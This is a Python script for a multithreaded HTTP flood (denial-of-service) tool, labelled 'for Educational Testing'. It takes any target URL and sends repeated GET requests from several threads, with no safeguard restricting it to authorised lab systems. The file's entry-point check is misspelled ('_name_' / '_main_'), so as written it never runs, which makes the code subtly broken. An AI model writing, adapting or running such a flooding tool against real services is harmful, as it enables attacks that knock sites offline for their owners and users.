import requests
import threading
import argparse
import time
from urllib.parse import urljoin

def http_flood(target_url, num_requests, num_threads):
    print(f"[*] Starting HTTP flood attack on {target_url}")
    print(f"[*] Sending {num_requests} requests per thread with {num_threads} threads...")
    
    def attack():
        for i in range(num_requests):
            try:
                response = requests.get(target_url, timeout=1)
                print(f"[+] Request {i+1}: Status {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[-] Request {i+1} failed: {e}")
            time.sleep(0.01)  # Small delay to avoid overwhelming the attacker machine
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    print("[*] Attack completed.")

def main():
    parser = argparse.ArgumentParser(description="Simple DDoS CLI Tool for Educational Testing")
    parser.add_argument("target", help="Target URL (e.g., http://192.168.56.101)")
    parser.add_argument("-r", "--requests", type=int, default=100, help="Number of requests per thread (default: 100)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    args = parser.parse_args()
    
    target_url = args.target
    num_requests = args.requests
    num_threads = args.threads
    
    # Validate the target URL
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Requests per thread: {num_requests}")
    print(f"[*] Threads: {num_threads}")
    
    # Test the target first
    try:
        response = requests.get(target_url, timeout=2)
        print(f"[+] Target is reachable: Status {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to reach target: {e}")
        return
    
    # Launch the HTTP flood attack
    http_flood(target_url, num_requests, num_threads)

if _name_ == "_main_":
    main()